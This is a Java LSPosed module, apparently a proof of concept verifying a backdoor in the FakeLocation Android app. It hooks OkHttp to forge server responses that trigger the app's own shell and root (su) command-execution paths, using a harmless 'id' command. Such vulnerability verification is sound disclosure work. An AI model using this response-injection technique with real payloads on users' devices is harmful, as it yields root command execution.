package com.fl.rcepoc;

import android.util.Log;

import java.util.concurrent.atomic.AtomicBoolean;

import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;

/*
 * FakeLocation 后门 RCE 动态验证 (LSPosed 模块)。
 *
 * 只 hook okhttp3.internal.http.RealInterceptorChain.proceed (包名稳定,不依赖 app 混淆名)。
 * 按请求 URL 改写响应体,触发 app 自身的后门执行分支:
 *   - getNotices                -> 响应改成 "10000:<cmd>",触发 notice 的 sh -c (app uid)
 *   - goods/getRenewalGoodsList -> 响应改成 {"code":10000,"message":"<cmd>"},触发同步回调的 su+sh (root)
 *   - ver/vfs                   -> 同上,触发官网/GitHub 版后台轮询的 su+sh (需激活 ROOT 模式, 未实测)
 * 不碰服务器,不改 app 文件,不碰 system_server。命令只用 id,输出写 /data/local/tmp (需预先 666)。
 * 适用 com.lerist.fakelocation 与 dev.lerist.fakelocation。
 */
public class RcePocModule implements IXposedHookLoadPackage {

    private static final String TAG = "FLRcePoC";
    private static final String CHAIN = "okhttp3.internal.http.RealInterceptorChain";

    private static final String OUT = "/data/local/tmp";
    private static final String NOTICE_PAYLOAD = "10000:id > " + OUT + "/poc_notice_sh.txt 2>&1";
    // 按执行 uid 分文件名: su 写 poc_gen_0.txt, sh 写 poc_gen_<appuid>.txt,两者不覆盖
    private static final String GENERIC_CMD = "id > " + OUT + "/poc_gen_$(id -u).txt 2>&1";
    private static final String GENERIC_JSON =
            "{\"code\":10000,\"message\":\"" + GENERIC_CMD.replace("\"", "\\\"") + "\",\"body\":null,\"extras\":null}";

    @Override
    public void handleLoadPackage(LoadPackageParam lp) {
        if (!"com.lerist.fakelocation".equals(lp.packageName)
                && !"dev.lerist.fakelocation".equals(lp.packageName)) return;
        Log.i(TAG, "loaded in " + lp.packageName);
        watchAndHookChain();
    }

    // app 加壳,okhttp 在解密后的 dex 里,晚于默认 loader。hook 所有 BaseDexClassLoader 构造,
    // 新 loader 能加载 RealInterceptorChain 时安装 hook (只装一次)。
    private void watchAndHookChain() {
        Class<?> bdcl = XposedHelpers.findClassIfExists("dalvik.system.BaseDexClassLoader", null);
        if (bdcl == null) { Log.w(TAG, "BaseDexClassLoader not found"); return; }
        final AtomicBoolean done = new AtomicBoolean(false);
        XposedBridge.hookAllConstructors(bdcl, new XC_MethodHook() {
            @Override
            protected void afterHookedMethod(MethodHookParam param) {
                if (done.get()) return;
                try {
                    ClassLoader cl = (ClassLoader) param.thisObject;
                    Class<?> chain = cl.loadClass(CHAIN);
                    if (chain != null && done.compareAndSet(false, true)) {
                        if (!hookProceed(chain)) done.set(false);
                    }
                } catch (ClassNotFoundException ignore) {
                } catch (Throwable t) { Log.w(TAG, "watch error", t); }
            }
        });
        Log.i(TAG, "watching classloaders for " + CHAIN);
    }

    private boolean hookProceed(final Class<?> chain) {
        try {
            final ClassLoader cl = chain.getClassLoader();
            XposedHelpers.findAndHookMethod(chain, "proceed", "okhttp3.Request", new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) {
                    try {
                        Object req = param.args[0];
                        Object resp = param.getResult();
                        if (req == null || resp == null) return;
                        String url = String.valueOf(XposedHelpers.callMethod(req, "url"));
                        if (url.contains("Notice/getNotices")) {
                            param.setResult(rebuild(cl, resp, NOTICE_PAYLOAD, "text/plain; charset=utf-8"));
                            Log.i(TAG, "INJECT notice @ " + url + " -> " + NOTICE_PAYLOAD);
                        } else if (url.contains("goods/getRenewalGoodsList") // 路径2: 同步 su 回调(打开续费页)
                                || url.contains("ver/vfs")) {                  // 路径3: 黑名单轮询(官网/GitHub 版后台定时)
                            param.setResult(rebuild(cl, resp, GENERIC_JSON, "application/json; charset=utf-8"));
                            Log.i(TAG, "INJECT generic @ " + url + " -> " + GENERIC_CMD);
                        }
                    } catch (Throwable t) { Log.w(TAG, "inject error", t); }
                }
            });
            Log.i(TAG, "hooked " + chain.getName() + ".proceed");
            return true;
        } catch (Throwable t) { Log.w(TAG, "hookProceed failed", t); return false; }
    }

    // 用 app 自己的 okhttp 类重建 Response,替换 body
    private Object rebuild(ClassLoader cl, Object resp, String content, String mime) throws Exception {
        Class<?> mtCls = cl.loadClass("okhttp3.MediaType");
        Class<?> rbCls = cl.loadClass("okhttp3.ResponseBody");
        Object mt = XposedHelpers.callStaticMethod(mtCls, "parse", mime);
        Object body;
        try { // okhttp 4.x: create(String, MediaType)
            body = XposedHelpers.callStaticMethod(rbCls, "create", content, mt);
        } catch (Throwable e) { // okhttp 3.x: create(MediaType, String)
            body = XposedHelpers.callStaticMethod(rbCls, "create", mt, content);
        }
        Object builder = XposedHelpers.callMethod(resp, "newBuilder");
        XposedHelpers.callMethod(builder, "body", body);
        return XposedHelpers.callMethod(builder, "build");
    }
}
